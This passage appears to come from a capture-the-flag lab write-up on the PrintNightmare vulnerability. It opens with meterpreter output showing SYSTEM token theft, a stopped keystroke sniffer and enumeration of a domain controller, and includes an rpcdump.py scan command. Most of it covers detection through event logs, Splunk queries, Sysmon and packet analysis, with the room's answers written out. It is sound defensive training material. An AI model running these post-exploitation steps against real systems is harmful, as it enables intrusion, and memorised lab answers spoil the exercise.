Stopping the keystroke sniffer...

meterpreter > getpid
Current pid: 3960

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeImpersonatePrivilege
SeTcbPrivilege

meterpreter > getsid
Server SID: S-1-5-18

meterpreter > localtime
Local Date/Time: 2022-11-15 14:15:39.615 Pacific Standard Time (UTC-800)

meterpreter > steal_token 3960
Stolen token with username: NT AUTHORITY\SYSTEM

meterpreter > arp

ARP cache
=========

    IP address       MAC address        Interface
    ----------       -----------        ---------
    10.10.0.1        02:c8:85:b5:5a:aa  7
    10.10.255.255    ff:ff:ff:ff:ff:ff  7
    224.0.0.22       00:00:00:00:00:00  1
    224.0.0.22       01:00:5e:00:00:16  7
    224.0.0.251      01:00:5e:00:00:fb  7
    224.0.0.252      01:00:5e:00:00:fc  7
    255.255.255.255  ff:ff:ff:ff:ff:ff  7

meterpreter > getproxy
Auto-detect     : Yes
Auto config URL : 
Proxy URL       : 
Proxy Bypass    : 

meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface  7
============
Name         : AWS PV Network Device #0
Hardware MAC : 02:ff:ec:b4:34:2b
MTU          : 9001
IPv4 Address : 10.10.66.59
IPv4 Netmask : 255.255.0.0
IPv6 Address : fe80::898e:c203:b99c:561f
IPv6 Netmask : ffff:ffff:ffff:ffff::

meterpreter > netstat

Connection list
===============

    Proto  Local address             Remote address  State        User  Inode  PID/Program name
    -----  -------------             --------------  -----        ----  -----  ----------------
    tcp    0.0.0.0:88                0.0.0.0:*       LISTEN       0     0      828/lsass.exe
    tcp    0.0.0.0:135               0.0.0.0:*       LISTEN       0     0      560/svchost.exe
    tcp    0.0.0.0:389               0.0.0.0:*       LISTEN       0     0      828/lsass.exe
    tcp    0.0.0.0:445               0.0.0.0:*       LISTEN       0     0      4/System
    tcp    0.0.0.0:464               0.0.0.0:*       LISTEN       0     0      828/lsass.exe
    tcp    0.0.0.0:593               0.0.0.0:*       LISTEN       0     0      560/svchost.exe
    tcp    0.0.0.0:636               0.0.0.0:*       LISTEN       0     0      828/lsass.exe
    tcp    0.0.0.0:3268              0.0.0.0:*       LISTEN       0     0      828/lsass.exe
    tcp    0.0.0.0:3269              0.0.0.0:*       LISTEN       0     0      828/lsass.exe
    tcp    0.0.0.0:3389              0.0.0.0:*       LISTEN       0     0      1092/svchost.exe
    tcp    0.0.0.0:5985              0.0.0.0:*       LISTEN       0     0      4/System
    tcp    0.0.0.0:9389              0.0.0.0:*       LISTEN       0     0      3448/Microsoft.ActiveDirect
    tcp    0.0.0.0:47001             0.0.0.0:*       LISTEN       0     0      4/System
    tcp    0.0.0.0:49664             0.0.0.0:*       LISTEN       0     0      692/wininit.exe
    tcp    0.0.0.0:49665             0.0.0.0:*       LISTEN       0     0      1476/svchost.exe
    tcp    0.0.0.0:49666             0.0.0.0:*       LISTEN       0     0      1728/svchost.exe
    tcp    0.0.0.0:49667             0.0.0.0:*       LISTEN       0     0      2136/svchost.exe
    tcp    0.0.0.0:49669             0.0.0.0:*       LISTEN       0     0      828/lsass.exe
    tcp    0.0.0.0:49670             0.0.0.0:*       LISTEN       0     0      828/lsass.exe
    tcp    0.0.0.0:49671             0.0.0.0:*       LISTEN       0     0      828/lsass.exe
    tcp    0.0.0.0:49689             0.0.0.0:*       LISTEN       0     0      808/services.exe
    tcp    0.0.0.0:49698             0.0.0.0:*       LISTEN       0     0      3420/dns.exe
    tcp    0.0.0.0:57057             0.0.0.0:*       LISTEN       0     0      3456/dfsrs.exe
    tcp    0.0.0.0:58284             0.0.0.0:*       LISTEN       0     0      1684/spoolsv.exe
    tcp    10.10.66.59:53            0.0.0.0:*       LISTEN       0     0      3420/dns.exe
    tcp    10.10.66.59:139           0.0.0.0:*       LISTEN       0     0      4/System
    tcp    10.10.66.59:56876         74.125.193.94:  SYN_SENT     0     0      3988/GoogleUpdate.exe
                                     80
    tcp    10.10.66.59:58280         10.8.19.103:44  ESTABLISHED  0     0      3960/rundll32.exe
                                     44
    tcp    127.0.0.1:53              0.0.0.0:*       LISTEN       0     0      3420/dns.exe
    tcp6   :::88                     :::*            LISTEN       0     0      828/lsass.exe
    tcp6   :::135                    :::*            LISTEN       0     0      560/svchost.exe
    tcp6   :::389                    :::*            LISTEN       0     0      828/lsass.exe
    tcp6   :::445                    :::*            LISTEN       0     0      4/System
    tcp6   :::464                    :::*            LISTEN       0     0      828/lsass.exe
    tcp6   :::593                    :::*            LISTEN       0     0      560/svchost.exe
    tcp6   :::636                    :::*            LISTEN       0     0      828/lsass.exe
    tcp6   :::3268                   :::*            LISTEN       0     0      828/lsass.exe
    tcp6   :::3269                   :::*            LISTEN       0     0      828/lsass.exe
    tcp6   :::3389                   :::*            LISTEN       0     0      1092/svchost.exe
    tcp6   :::5985                   :::*            LISTEN       0     0      4/System
    tcp6   :::9389                   :::*            LISTEN       0     0      3448/Microsoft.ActiveDirecto
    tcp6   :::47001                  :::*            LISTEN       0     0      4/System
    tcp6   :::49664                  :::*            LISTEN       0     0      692/wininit.exe
    tcp6   :::49665                  :::*            LISTEN       0     0      1476/svchost.exe
    tcp6   :::49666                  :::*            LISTEN       0     0      1728/svchost.exe
    tcp6   :::49667                  :::*            LISTEN       0     0      2136/svchost.exe
    tcp6   :::49669                  :::*            LISTEN       0     0      828/lsass.exe
    tcp6   :::49670                  :::*            LISTEN       0     0      828/lsass.exe
    tcp6   :::49671                  :::*            LISTEN       0     0      828/lsass.exe
    tcp6   :::49689                  :::*            LISTEN       0     0      808/services.exe
    tcp6   :::49698                  :::*            LISTEN       0     0      3420/dns.exe
    tcp6   :::57057                  :::*            LISTEN       0     0      3456/dfsrs.exe
    tcp6   :::58284                  :::*            LISTEN       0     0      1684/spoolsv.exe
    tcp6   ::1:53                    :::*            LISTEN       0     0      3420/dns.exe
    tcp6   ::1:389                   ::1:49677       ESTABLISHED  0     0      828/lsass.exe
    tcp6   ::1:389                   ::1:49678       ESTABLISHED  0     0      828/lsass.exe
    tcp6   ::1:389                   ::1:49696       ESTABLISHED  0     0      828/lsass.exe
    tcp6   ::1:49677                 ::1:389         ESTABLISHED  0     0      3284/ismserv.exe
    tcp6   ::1:49678                 ::1:389         ESTABLISHED  0     0      3284/ismserv.exe
    tcp6   ::1:49696                 ::1:389         ESTABLISHED  0     0      3420/dns.exe
    tcp6   fe80::898e:c203:b99c:561  :::*            LISTEN       0     0      3420/dns.exe
           f:53
    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  ESTABLISHED  0     0      828/lsass.exe
           f:389                     3:b99c:561f:49
                                     697
    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  ESTABLISHED  0     0      828/lsass.exe
           f:389                     3:b99c:561f:57
                                     052
    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  ESTABLISHED  0     0      828/lsass.exe
           f:389                     3:b99c:561f:57
                                     055
    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  ESTABLISHED  0     0      828/lsass.exe
           f:49669                   3:b99c:561f:57
                                     054
    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  ESTABLISHED  0     0      828/lsass.exe
           f:49669                   3:b99c:561f:58
                                     325
    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  ESTABLISHED  0     0      3420/dns.exe
           f:49697                   3:b99c:561f:38
                                     9
    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  TIME_WAIT    0     0      0/[System Process]
           f:56873                   3:b99c:561f:13
                                     5
    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  ESTABLISHED  0     0      3456/dfsrs.exe
           f:57052                   3:b99c:561f:38
                                     9
    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  ESTABLISHED  0     0      3456/dfsrs.exe
           f:57054                   3:b99c:561f:49
                                     669
    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  ESTABLISHED  0     0      3456/dfsrs.exe
           f:57055                   3:b99c:561f:38
                                     9
    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  ESTABLISHED  0     0      828/lsass.exe
           f:58325                   3:b99c:561f:49
                                     669
    udp    0.0.0.0:123               0.0.0.0:*                    0     0      1452/svchost.exe
    udp    0.0.0.0:389               0.0.0.0:*                    0     0      828/lsass.exe
    udp    0.0.0.0:3389              0.0.0.0:*                    0     0      1092/svchost.exe
    udp    0.0.0.0:5353              0.0.0.0:*                    0     0      1580/svchost.exe
    udp    0.0.0.0:5355              0.0.0.0:*                    0     0      1580/svchost.exe
    udp    0.0.0.0:51070             0.0.0.0:*                    0     0      3420/dns.exe
    udp    0.0.0.0:51072             0.0.0.0:*                    0     0      3420/dns.exe

    udp6   ::1:53                    :::*                         0     0      3420/dns.exe
    udp6   ::1:51069                 :::*                         0     0      3420/dns.exe
    udp6   fe80::898e:c203:b99c:561  :::*                         0     0      3420/dns.exe
           f:53
    udp6   fe80::898e:c203:b99c:561  :::*                         0     0      828/lsass.exe
           f:88
    udp6   fe80::898e:c203:b99c:561  :::*                         0     0      828/lsass.exe
           f:464

meterpreter > route

IPv4 network routes
===================

    Subnet           Netmask          Gateway      Metric  Interface
    ------           -------          -------      ------  ---------
    0.0.0.0          0.0.0.0          10.10.0.1    25      7
    10.10.0.0        255.255.0.0      10.10.66.59  281     7
    10.10.66.59      255.255.255.255  10.10.66.59  281     7
    10.10.255.255    255.255.255.255  10.10.66.59  281     7
    127.0.0.0        255.0.0.0        127.0.0.1    331     1
    127.0.0.1        255.255.255.255  127.0.0.1    331     1
    127.255.255.255  255.255.255.255  127.0.0.1    331     1
    169.254.169.123  255.255.255.255  10.10.0.1    50      7
    169.254.169.249  255.255.255.255  10.10.0.1    50      7
    169.254.169.250  255.255.255.255  10.10.0.1    50      7
    169.254.169.251  255.255.255.255  10.10.0.1    50      7
    169.254.169.253  255.255.255.255  10.10.0.1    50      7
    169.254.169.254  255.255.255.255  10.10.0.1    50      7
    224.0.0.0        240.0.0.0        127.0.0.1    331     1
    224.0.0.0        240.0.0.0        10.10.66.59  281     7
    255.255.255.255  255.255.255.255  127.0.0.1    331     1
    255.255.255.255  255.255.255.255  10.10.66.59  281     7

No IPv6 routes were found.

meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x64   0
 88    4     Registry           x64   0
 412   808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 428   4     smss.exe           x64   0
 560   808   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 596   584   csrss.exe
 672   664   csrss.exe
 692   584   wininit.exe        x64   0
 740   664   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.e
                                                                             xe
 808   692   services.exe       x64   0
 828   692   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 852   3164  GoogleUpdate.exe   x86   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Google\
                                                                             Update\GoogleUpdate.exe
 960   808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 1016  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 1040  740   dwm.exe            x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 1084  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 1092  808   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 1176  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 1196  808   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1360  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.ex
                                                                             e
 1368  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.ex
                                                                             e
 1384  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.ex
                                                                             e
 1436  808   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1444  808   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1452  808   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1460  808   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1468  808   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1476  808   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1496  852   GoogleCrashHandle  x86   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Google\
             r.exe                                                           Update\1.3.36.102\GoogleCrashH
                                                                             andler.exe
 1560  808   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1572  852   GoogleCrashHandle  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Google\
             r64.exe                                                         Update\1.3.36.102\GoogleCrashH
                                                                             andler64.exe
 1580  808   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 1652  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 1684  808   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM
 1728  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 1792  808   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1852  808   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1888  808   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 1896  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 1944  808   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1984  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 2020  808   SecurityHealthSer  x64   0
             vice.exe
 2056  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 2080  808   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 2092  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 2128  808   msdtc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE
 2136  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 2156  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.ex
                                                                             e
 2204  808   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 2228  808   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 2612  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 2656  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 2736  740   fontdrvhost.exe    x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhos
                                                                             t.exe
 2812  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 2832  692   fontdrvhost.exe    x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhos
                                                                             t.exe
 3080  808   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 3088  808   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 3116  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 3172  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.ex
                                                                             e
 3228  808   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 3236  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 3276  808   amazon-ssm-agent.  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\am
             exe                                                             azon-ssm-agent.exe
 3284  808   ismserv.exe        x64   0        NT AUTHORITY\SYSTEM
 3308  808   dfssvc.exe         x64   0        NT AUTHORITY\SYSTEM
 3316  808   MsMpEng.exe        x64   0
 3420  808   dns.exe            x64   0        NT AUTHORITY\SYSTEM
 3448  808   Microsoft.ActiveD  x64   0        NT AUTHORITY\SYSTEM
             irectory.WebServi
             ces.exe
 3456  808   dfsrs.exe          x64   0        NT AUTHORITY\SYSTEM
 3464  808   LiteAgent.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentoo
                                                                             ls\LiteAgent.exe
 3484  808   Sysmon.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Sysmon.exe
 3664  412   unsecapp.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\unsec
                                                                             app.exe
 3960  2892  rundll32.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\rundll32.e
                                                                             xe
 4104  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 4496  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 4528  808   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 4564  808   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 4592  740   LogonUI.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.ex
                                                                             e

meterpreter > show_mount

Mounts / Drives
===============

Name  Type   Size (Total)  Size (Free)  Mapped to
----  ----   ------------  -----------  ---------
C:\   fixed  14.46 GiB     3.21 GiB


Total mounts/drives: 1

meterpreter > getlwd
/root
meterpreter > getwd
C:\Windows\system32

meterpreter > checksum md5 'c:\Users\Administrator\Desktop\flag.txt'
415aa878505c85f197da96735e913c56  c:\Users\Administrator\Desktop\flag.txt
meterpreter > checksum sha1 'c:\Users\Administrator\Desktop\flag.txt'
1efee204f22a548f5162b9da4f7453fbcffac022  c:\Users\Administrator\Desktop\flag.txt

meterpreter > rev2self
meterpreter > uuid
[+] UUID: b071f40c768b4e8a/x64=2/windows=1/2022-11-15T21:06:29Z
meterpreter > machine_id
[+] Machine ID: 01f3c728d1f70b69ab53c6c53840e306

after power off machine

meterpreter > shell
....
```

What is the flag residing on the Administrator's Desktop?
*THM{SiGBQPMkSvejvmQNEL}*

### Indicators of Compromise 

![333](https://i.ibb.co/N1F0Jg3/tuxpi-com-1629004433.jpg)

A Proof of Concept is often a piece of code or an application that is used to demonstrate an idea or theory is possible. Proof of Concepts are often used to demonstrate vulnerabilities 

Let's imagine the worst-case scenario that the THMdepartment was compromised a couple of days after the PoC for PrintNightmare was released, and you are THMdepartment's Threat Hunter. Your company suspects that an attacker used PrintNightmare to access the Domain Controller, and your task is to find evidence or indicators of compromise. So, the next question would be what indicators should you look for in order to detect the PrintNightmare attack? 

https://github.com/cube0x0/CVE-2021-1675

The attacker would most likely use rpcdump.py to scan for vulnerable hosts. After finding the vulnerable print server, the attacker can then execute the exploit code (similar to the Python script in the previous task), which will load the malicious DLL file to exploit the vulnerability. More specifically, the exploit code will call the pcAddPrinterDriverEx() function from the authenticated user account and load the malicious DLL file in order to exploit the vulnerability. The pcAddPrinterDriverEx() function is used to install a printer driver on the system.

Sygnia shared some advanced threat hunting tips to detect PrintNightmare. When hunting for PrintNightmare, you should look for the following:

https://www.sygnia.co/demystifying-the-printnightmare-vulnerability

    Search for the spoolsv.exe process launching rundll32.exe as a child process without any command-line arguments
    Considering the usage of the pcAddPrinterDriverEx() function, you will mostly find the malicious DLL dropped into one of these folders %WINDIR%\system32\spool\drivers\x64\3\ folder along with DLLs that were loaded afterward from %WINDIR%\system32\spool\drivers\x64\3\Old\ (You should proactively monitor the folders for any unusual DLLs)
    Hunt for suspicious spoolsv.exe child processes (cmd.exe, powershell.exe, etc.)
    The attacker might even use Mimikatz to perform the attack, in this case, a print driver named ‘QMS 810’ will be created. This can be detected by logging the registry changes (e.g., Sysmon ID 13).
    Search for DLLs that are part of the proof-of-concept codes that were made public, such as MyExploit.dll, evil.dll, addCube.dll, rev.dll, rev2.dll, main64.dll, mimilib.dll. If they're present on the endpoint, you can find them with Event ID 808 in Microsoft-Windows-PrintService.

https://www.splunk.com/en_us/blog/security/i-pity-the-spool-detecting-printnightmare-cve-2021-34527.html

Splunk also did a great job of providing us with some detection search queries:

Identifies Print Spooler adding a new Printer Driver:

source="WinEventLog:Microsoft-Windows-PrintService/Operational" 
EventCode=316 category = "Adding a printer driver" Message = "*kernelbase.dll,*" Message = "*UNIDRV.DLL,*" Message = "*.DLL.*" 
| stats count min(_time) as firstTime max(_time) as lastTime by OpCode EventCode ComputerName Message 

Detects spoolsv.exe with a child process of rundll32.exe:

| tstats count min(_time) as firstTime max(_time) as lastTime from 
datamodel=Endpoint.Processes where 
Processes.parent_process_name=spoolsv.exe 
Processes.process_name=rundll32.exe by Processes.dest Processes.user 
Processes.parent_process Processes.process_name Processes.process 
Processes.process_id Processes.parent_process_id

Suspicious rundll32.exe instances without any command-line arguments:

| tstats count FROM datamodel=Endpoint.Processes where 
Processes.process_name=spoolsv.exe by _time Processes.process_id Processes.process_name Processes.dest 
| rename "Processes.*" as * 
| join process_guid _time 
    [| tstats count min(_time) as firstTime max(_time) as lastTime FROM datamodel=Endpoint.Filesystem where 
Filesystem.file_path="*\\spool\\drivers\\x64\\*" Filesystem.file_name="*.dll" by _time 
Filesystem.dest Filesystem.file_create_time Filesystem.file_name Filesystem.file_path 
    | rename "Filesystem.*" as * 
    | fields _time dest file_create_time file_name file_path process_name process_path process] 
| dedup file_create_time 
| table dest file_create_time, file_name, file_path, process_name

Detects when a new printer plug-in has failed to load:

source="WinEventLog:Microsoft-Windows-PrintService/Admin" ((ErrorCode="0x45A" (EventCode="808" OR EventCode="4909")) 
OR ("The print spooler failed to load a plug-in module" OR "\\drivers\\x64\\")) 
  | stats count min(_time) as firstTime max(_time) as lastTime by OpCode EventCode ComputerName Message

If you are interested in learning Splunk, refer to the following rooms:

    Splunk 101
    Splunk
    Splunk 2
    Splunk 3


Provide the first folder path where you would likely find the dropped DLL payload.

	*C:\Windows\System32\spool\drivers\x64\3*



Provide the function that is used to install printer drivers.
*pcAddPrinterDriverEx()*



What tool can the attacker use to scan for vulnerable print servers?
```
┌──(root㉿kali)-[~/home/witty/Desktop/impacket]
└─# rpcdump.py @10.10.66.59 | egrep 'MS-RPRN|MS-PAR' 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 

```
*rpcdump.py*


### Detection: Windows Event Logs 

![|333](https://i.ibb.co/WfD09LG/EVENTLOG.png)


Windows Event Logs are detailed records of security, system, and application notifications created by the Windows operating system. There are some logs that record events related to Print Spooler activity. Still, they might not be enabled by default and need to be configured using Windows Group Policy or Powershell. 

The logs related to Print Spooler Activity are:

    Microsoft-Windows-PrintService/Admin
    Microsoft-Windows-PrintService/Operational

We can detect the PrintNightmare artifacts by looking at the endpoint events or Windows Event Logs mentioned above.

You can look for the following Event IDs:

    Microsoft-Windows-PrintService/Operational (Event ID 316) - look for "Printer driver [file] for Windows x64 Version-3 was added or updated. Files:- UNIDRV.DLL, AddUser.dll, AddUser.dll. No user action is required.”
    Microsoft-Windows-PrintService/Admin (Event ID 808) - A security event source has attempted to register (can detect unsigned drivers and malicious DLLs loaded by spoolsv.exe)
    Microsoft-Windows-PrintService/Operational (Event ID 811) - Logs the information regarding failed operations. The event will provide information about the full path of the dropped DLL.
    Microsoft-Windows-SMBClient/Security (Event ID 31017) - This Event ID can also be used to detect unsigned drivers loaded by spoolsv.exe.
    Windows System (Event ID 7031) - Service Stop Operations (This event ID will show you unexpected termination of print spooler service).

You can also use Sysmon to detect PrintNightmare terror: 

    Microsoft-Windows-Sysmon/Operational (Event ID 3) - Network connection (Look for suspicious ports)

    Microsoft-Windows-Sysmon/Operational (Event ID 11) - FileCreate (File creation events are being logged,  you can look for loaded DLLs in the Print Spooler’s driver directory: C:\Windows\System32\spool\drivers\x64\3)

    Microsoft-Windows-Sysmon/Operational (Event IDs 23, 26) - FileDelete (You can hunt for deleted malicious DLLs)

You are still in the middle of hunting for THMDepartment to determine if the PrintNightmare attack actually took place.

Armed with all the knowledge above, can you detect the PrintNightmare artifacts in the Event Logs? 

```
using event viewer , go to Applications and Services Logs -> Microsoft -> windows -> PrintService

and create a custom viewer (by log Application/Security,Setup,System,Forwarded... accept all and then search the other box in the same By log with Applications and Services Logs -> Microsoft -> windows -> PrintService, is ticked admin and operational)

and filter with event id like 316,808,811,31017,7031

there's 1 log with event ID 808
The print spooler failed to load a plug-in module C:\Windows\system32\spool\DRIVERS\x64\3\svch0st.dll, error code 0x45A. See the event user data for context information.

There's 1 log more with event ID 7031
The Print Spooler service terminated unexpectedly.  It has done this 1 time(s).  The following corrective action will be taken in 5000 milliseconds: Restart the service.

Let’s create a new custom view:
Using the sources Applications and Services Logs -> Microsoft -> windows -> Sysmon.
and event id 3

save filter to custom view like any name

Network connection detected:
RuleName: -
UtcTime: 2021-08-13 17:33:38.098
ProcessGuid: {9269562d-acf2-6116-3001-000000000b00}
ProcessId: 7108
Image: C:\Windows\System32\rundll32.exe
User: NT AUTHORITY\SYSTEM
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.10.192.122
SourceHostname: Finance-01.THMdepartment.local
SourcePort: 53654
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 10.10.210.100
DestinationHostname: ip-10-10-210-100.eu-west-1.compute.internal
DestinationPort: 4747
DestinationPortName: 

changing from 3 to 11

File created:
RuleName: DLL
UtcTime: 2021-08-13 17:33:40.673
ProcessGuid: {9269562d-a832-6116-3c00-000000000b00}
ProcessId: 2244
Image: C:\Windows\System32\spoolsv.exe
TargetFilename: C:\Windows\System32\spool\drivers\x64\3\New\svch0st.dll
CreationUtcTime: 2021-08-13 17:33:40.673



```
![[Pasted image 20221115174712.png]]

![[Pasted image 20221115180003.png]]

![[Pasted image 20221115180532.png]]


![[Pasted image 20221115181153.png]]

![[Pasted image 20221115181524.png]]

![[Pasted image 20221115182321.png]]


Provide the name of the dropped DLL, including the error code. (no space after the comma) 
You're looking for malicious DLLs loaded by spoolsv.exe.
*svch0st.dll,0x45A*


Provide the event log name and the event ID that detected the dropped DLL. (no space after the comma) 
*Microsoft-Windows-PrintService/Admin,808*



Find the source name and the event ID when the Print Spooler Service stopped unexpectedly and how many times was this event logged? (format: answer,answer,answer)
*Service Control Manager,7031,1*

After some threat hunting steps, you are more confident now that it's a PrintNightmare attack. Hunt for the attacker's shell connection. Provide the log name, event ID, and destination port. (format: answer,answer,answer)
*Microsoft-Windows-Sysmon/Operational,3,4747*


Oh no! You think you've found the attacker's connection. You need to know the attacker's IP address and the destination hostname in order to terminate the connection.  Provide the attacker's IP address and the hostname. (format: answer,answer)
*ip-10-10-210-100.eu-west-1.compute.internal*



A Sysmon FileCreated event was generated and logged. Provide the full path to the dropped DLL and the earliest creation time in UTC.  (format:answer,yyyy-mm-dd hh-mm-ss)
Check Sysmon Event ID 3 or 11
	
	*C:\Windows\System32\spool\drivers\x64\3\New\svch0st.dll,2021-08-13 17:33:40.673*

###  Detection: Packet Analysis 

![|333](https://i.ibb.co/wpj95n7/tuxpi-com-1629073907.jpg)

Packet captures (pcap) play a crucial role in detecting signs of compromise.

If you are not familiar with Wireshark, no worries. You can learn more about Wireshark and how to analyze the packet captures by joining the Wireshark 101 room. It will be a lot of fun! 

Detecting the PrintNightmare attack, specifically to (CVE-2021-1675 and CVE-2021-34527) by analyzing the network traffic is not as easy as inspecting the artifacts like Windows Event Logs on the victim's machine. The attacker relies on adding a printer driver using DCE/RPC commands RpcAddPrinterDriver or RpcAddPrinterDriverEx.

https://wiki.wireshark.org/DCE/RPC

DCE/RPC stands for Distributed Computing Environment/Remote Procedure Calls and is the remote procedure call that establishes APIs and an over-the-network protocol.  But what makes the detection of the attack harder is that there are legitimate uses for RpcAddPrinterDriver or RpcAddPrinterDriverEx commands, so you cannot always rely only on the network traffic analysis to be confident that the PrintNightmare attack occurred in your environment. According to Corelight, it can get even harder to detect, especially if the exploit wraps the DCE/RPC calls in [SMB3 encryption](https://docs.microsoft.com/en-us/windows-server/storage/file-server/smb-security#:~:text=SMB%20Encryption%20provides%20end%2Dto,eavesdropping%20occurrences%20on%20untrusted%20networks.&text=SMB%20Encryption%20can%20be%20configured,where%20data%20traverses%20untrusted%20networks.). To identify the encrypted DCE/RPC calls, you need to somehow decrypt and decode the payloads, which is a time-consuming task. 

[Corelight](https://corelight.com/blog/why-is-printnightmare-hard-to-detect) also released a [Zeek package](https://github.com/corelight/CVE-2021-1675) that detects the printer driver additions over DCE/RPC commands that are not encrypted. 

Attached to this task is a PCAP from a PrintNightmare attack you can download and open in your local Wireshark instance. 

Task: Inspect the PCAP and answer the questions below. 
https://yacin.nadji.us/posts/2021/07/printnightmare-smb3-encryption-and-your-network/

```
using wiresharkt, find .local

Session Id: 0x0000200018000041 Acct:lowprivlarry Domain:WIN-1O0UJBNP9G7.printnightmare.local Host:

find .dll

Search Pattern: letmein.dll
[Tree: \\10.10.124.236\sharez]

Encrypted SMB3 data
Data: eb4396d044014b5a79a0cf16c21a993b59bc46d4b209268c161505487f0ab353bf4a992e…
```

![[Pasted image 20221115184437.png]]

![[Pasted image 20221115184827.png]]

What is the host name of the domain controller?
*WIN-1O0UJBNP9G7*


What is the local domain?
*WIN-1O0UJBNP9G7*


What user account was utilized to exploit the vulnerability?
*lowprivlarry*


What was the malicious DLL used in the exploit?
*letmein.dll*


What was the attacker's IP address?
*10.10.124.236*


What was the UNC path where the malicious DLL was hosted?
		
		*\\10.10.124.236\sharez*


There are encrypted packets in the results. What was the associated protocol?
*SMB3*

### Mitigation: Disable Print Spooler 

![|333](https://i.ibb.co/gzg7FxK/DEFENSE.png)

It was not just a nightmare, and now you are 100% confident that it was a PrintNightmare attack on THMDepartment. You checked the other domain controllers on your network, and it appears that they are clean.

It is not the end of the world just yet. You can still mitigate or defend against the attack by disabling the Print Spooler on all domain controllers and modify the registry settings (if applicable). How can you do it?

